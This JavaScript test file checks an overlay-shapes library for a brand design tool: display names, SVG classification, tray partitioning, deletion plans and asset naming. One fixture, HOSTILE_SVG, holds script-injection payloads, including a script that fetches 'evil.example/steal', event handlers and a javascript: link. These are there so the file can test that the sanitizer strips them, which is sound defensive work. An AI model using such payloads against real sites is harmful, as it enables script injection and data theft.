// Overlay shapes contract (client rulings 2026-08-18): stable-id display
// naming (Petal 1/2/3 · Motif 1), upload sanitize + classify, tray partition,
// deletion semantics, and the single "Line art" mode's per-asset renderer.
import test from 'node:test';
import assert from 'node:assert/strict';

import {
  OVERLAY_ART_LINEWORK,
  OVERLAY_ART_SILHOUETTE,
  buildBrandAssetObjectName,
  classifySvgArt,
  displayOverlayName,
  isLineArtMode,
  lineArtModeFor,
  normalizeOverlayModeForAsset,
  overlayArtClass,
  parseBrandAssetObjectName,
  partitionShapeTray,
  sanitizeSvgText,
  shapeDeletePlan,
  svgAspectRatio,
} from '../../lib/overlay-shapes.mjs';
import { DEFAULT_OVERLAY_ASSETS } from '../../lib/brand-defaults.js';

// ── Fixtures ────────────────────────────────────────────────────────────────
const SILHOUETTE_SVG = `<svg width="169" height="207" viewBox="0 0 169 207" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M169 106C169 159 124 207 80 207C36 207 0 159 0 106C0 53 18 0 62 0C106 0 161 50 169 106Z" fill="#F5F6E7" fill-opacity="0.4"/>
</svg>`;

const LINE_DRAWING_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" fill="none">
<path d="M60 8c3 31 20 48 52 52" stroke="#254E48" stroke-width="7" fill="none"/>
<path d="M20 20c10 10 30 10 40 0" stroke="#254E48" stroke-width="4"/>
</svg>`;

const HOSTILE_SVG = `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://evil.example/svg.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10" onload="alert(1)">
<script>fetch('https://evil.example/steal')</script>
<defs><linearGradient id="g"/></defs>
<image xlink:href="https://evil.example/x.png" width="10" height="10"/>
<use href="#g"/>
<a href="javascript:alert(2)"><path d="M0 0h10v10H0z" fill="#000" onclick="alert(3)"/></a>
<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://evil.example"/></body></foreignObject>
<rect width="4" height="4" style="fill:url(https://evil.example/paint)"/>
</svg>`;

// ── Display names (ids stay stable — presentation only) ─────────────────────
test('displayOverlayName presents built-in Shape 1/2/3 as Petal 1/2/3', () => {
  assert.equal(displayOverlayName({ id: 'shape-1', name: 'Shape 1' }), 'Petal 1');
  assert.equal(displayOverlayName({ id: 'shape-2', name: 'Shape 2' }), 'Petal 2');
  assert.equal(displayOverlayName({ id: 'shape-3', name: 'Shape 3' }), 'Petal 3');
});

test('displayOverlayName presents the uploaded "image 1" motif as Motif 1 (name-keyed — its id is a storage path)', () => {
  assert.equal(
    displayOverlayName({ id: 'brand-assets/1784009219793__center__1149__image_1.png', name: 'image 1' }),
    'Motif 1',
  );
  assert.equal(displayOverlayName({ id: 'x', name: 'Image 1' }), 'Motif 1'); // case-insensitive
});

test('displayOverlayName leaves other assets untouched and never renames at the id level', () => {
  assert.equal(displayOverlayName({ id: 'petal-brand', name: 'Petal' }), 'Petal');
  assert.equal(displayOverlayName({ id: 'acc-spark', name: 'Spark' }), 'Spark');
  assert.equal(displayOverlayName({ id: 'up_abc', name: 'My Leaf' }), 'My Leaf');
  assert.equal(displayOverlayName({}), 'Shape');
});

// ── Art class + the single Line art mode ────────────────────────────────────
test('overlayArtClass: built-in petal silhouettes classify silhouette, uploads default linework, explicit art wins', () => {
  for (const asset of DEFAULT_OVERLAY_ASSETS.filter(a => a.category === 'overlays')) {
    assert.equal(overlayArtClass(asset), OVERLAY_ART_SILHOUETTE, asset.id);
  }
  assert.equal(overlayArtClass({ id: 'up_1', kind: 'center' }), OVERLAY_ART_LINEWORK);
  assert.equal(overlayArtClass({ id: 'up_2', art: OVERLAY_ART_SILHOUETTE }), OVERLAY_ART_SILHOUETTE);
  assert.equal(overlayArtClass({ id: 'shape-1', builtin: true, category: 'overlays', art: OVERLAY_ART_LINEWORK }), OVERLAY_ART_LINEWORK);
});

test('lineArtModeFor picks the stroked-silhouette painter for silhouettes and the native-stroke painter for line drawings', () => {
  assert.equal(lineArtModeFor({ builtin: true, category: 'overlays' }), 'outline');
  assert.equal(lineArtModeFor({ official: true, kind: 'center' }), 'lineart');
});

test('normalizeOverlayModeForAsset re-points only the line-art spellings; frame/fill pass through', () => {
  const petal = { id: 'shape-1', builtin: true, category: 'overlays' };
  const motif = { id: 'brand-assets/x.png', official: true, kind: 'center' };
  assert.equal(normalizeOverlayModeForAsset('lineart', petal), 'outline'); // petal's bad alternative removed
  assert.equal(normalizeOverlayModeForAsset('outline', petal), 'outline');
  assert.equal(normalizeOverlayModeForAsset('outline', motif), 'lineart'); // motif's bad alternative removed
  assert.equal(normalizeOverlayModeForAsset('lineart', motif), 'lineart');
  assert.equal(normalizeOverlayModeForAsset('frame', petal), 'frame');
  assert.equal(normalizeOverlayModeForAsset('overlay', motif), 'overlay');
  assert.ok(isLineArtMode('outline') && isLineArtMode('lineart') && !isLineArtMode('frame'));
});

// ── Upload sanitizing ───────────────────────────────────────────────────────
test('sanitizeSvgText strips scripts, handlers, foreignObject, external refs and DOCTYPE', () => {
  const { svg, changed } = sanitizeSvgText(HOSTILE_SVG);
  assert.ok(changed);
  assert.doesNotMatch(svg, /<script/i);
  assert.doesNotMatch(svg, /\bon[a-z]+\s*=/i);
  assert.doesNotMatch(svg, /<foreignObject/i);
  assert.doesNotMatch(svg, /evil\.example/i);
  assert.doesNotMatch(svg, /javascript:/i);
  assert.doesNotMatch(svg, /<!DOCTYPE/i);
  assert.match(svg, /href="#g"/);            // local fragment refs survive
  assert.match(svg, /<path d="M0 0h10v10H0z" fill="#000"/); // artwork survives
});

test('sanitizeSvgText leaves a clean brand SVG byte-identical', () => {
  const { svg, changed } = sanitizeSvgText(SILHOUETTE_SVG);
  assert.equal(changed, false);
  assert.equal(svg, SILHOUETTE_SVG);
});

// ── Upload classification ───────────────────────────────────────────────────
test('classifySvgArt: closed filled path → silhouette; stroke-carrying drawing → linework', () => {
  assert.equal(classifySvgArt(SILHOUETTE_SVG), OVERLAY_ART_SILHOUETTE);
  assert.equal(classifySvgArt(LINE_DRAWING_SVG), OVERLAY_ART_LINEWORK);
  // stroke="none" is not a stroke; fill="none" is not a fill
  assert.equal(classifySvgArt('<svg><path d="M0 0" fill="#000" stroke="none"/></svg>'), OVERLAY_ART_SILHOUETTE);
  // no explicit paint at all = SVG default black fill = silhouette
  assert.equal(classifySvgArt('<svg><path d="M0 0h5v5z"/></svg>'), OVERLAY_ART_SILHOUETTE);
});

test('svgAspectRatio reads viewBox first, then width/height, then 1', () => {
  assert.ok(Math.abs(svgAspectRatio(SILHOUETTE_SVG) - 169 / 207) < 1e-9);
  assert.equal(svgAspectRatio('<svg width="300" height="100"></svg>'), 3);
  assert.equal(svgAspectRatio('not svg'), 1);
});

// ── Tray partition ──────────────────────────────────────────────────────────
test('partitionShapeTray: petals + uploaded shape-class assets share the Shapes row; accessories stay Decoration', () => {
  const overlays = [
    { id: 'petal-brand', builtin: true, category: 'overlays', kind: 'center' },
    { id: 'shape-1', builtin: true, category: 'overlays', kind: 'center' },
    { id: 'acc-spark', builtin: true, category: 'accessories', kind: 'accessory' },
    { id: 'brand-assets/motif.png', official: true, category: 'overlays', kind: 'center' },
    { id: 'brand-assets/frame.svg', official: true, category: 'overlays', kind: 'frame' },
    { id: 'orchid-petal', builtin: true, category: 'overlays', kind: 'center' },
  ];
  const { shapes, decorations } = partitionShapeTray(overlays, { retired: ['orchid-petal'], hidden: [] });
  assert.deepEqual(shapes.map(a => a.id), ['petal-brand', 'shape-1', 'brand-assets/motif.png']);
  assert.deepEqual(decorations.map(a => a.id), ['acc-spark', 'brand-assets/frame.svg']);
});

test('partitionShapeTray: hidden ids leave the tray only (picker filter, not an asset delete)', () => {
  const overlays = [
    { id: 'shape-1', builtin: true, category: 'overlays', kind: 'center' },
    { id: 'shape-2', builtin: true, category: 'overlays', kind: 'center' },
  ];
  const { shapes } = partitionShapeTray(overlays, { hidden: ['shape-2'] });
  assert.deepEqual(shapes.map(a => a.id), ['shape-1']);
  // the source list itself is untouched — placed instances resolve as before
  assert.equal(overlays.length, 2);
});

// ── Deletion semantics ──────────────────────────────────────────────────────
test('shapeDeletePlan: uploads truly delete (standard confirm); built-ins hide brand-wide (stronger confirm)', () => {
  const uploaded = shapeDeletePlan({ id: 'brand-assets/x.svg', official: true, name: 'Leaf' });
  assert.equal(uploaded.action, 'remove');
  assert.equal(uploaded.confirm, 'standard');
  assert.match(uploaded.message, /permanently removes the shape from your brand/);

  const builtin = shapeDeletePlan({ id: 'shape-1', builtin: true, name: 'Shape 1' });
  assert.equal(builtin.action, 'hide');
  assert.equal(builtin.confirm, 'brand');
  assert.match(builtin.message, /brand-wide/);
  assert.match(builtin.message, /Petal 1/);            // names it with its display name
  assert.match(builtin.message, /keep rendering/);     // honest about placed instances
});

// ── Brand-asset object names (art segment, backward compatible) ─────────────
test('parseBrandAssetObjectName: legacy 4-segment names parse with art:null', () => {
  const meta = parseBrandAssetObjectName('1784009219793__center__1149__image_1.png');
  assert.deepEqual(meta, { ts: 1784009219793, kind: 'center', ratio: 1.149, art: null, name: 'image 1', ext: 'png' });
});

test('brand-asset object names round-trip the art segment', () => {
  const name = buildBrandAssetObjectName({ ts: 123, kind: 'center', ratio: 0.816, art: OVERLAY_ART_SILHOUETTE, name: 'My_Leaf', ext: 'svg' });
  assert.equal(name, '123__center__816__sil__My_Leaf.svg');
  const meta = parseBrandAssetObjectName(name);
  assert.equal(meta.art, OVERLAY_ART_SILHOUETTE);
  assert.equal(meta.name, 'My Leaf');
  const line = parseBrandAssetObjectName(buildBrandAssetObjectName({ ts: 9, kind: 'center', ratio: 2, art: OVERLAY_ART_LINEWORK, name: 'Vine', ext: 'png' }));
  assert.equal(line.art, OVERLAY_ART_LINEWORK);
});

test('the hidden-overlays bucket marker never parses as an asset', () => {
  assert.equal(parseBrandAssetObjectName('hidden-overlays.json'), null);
});
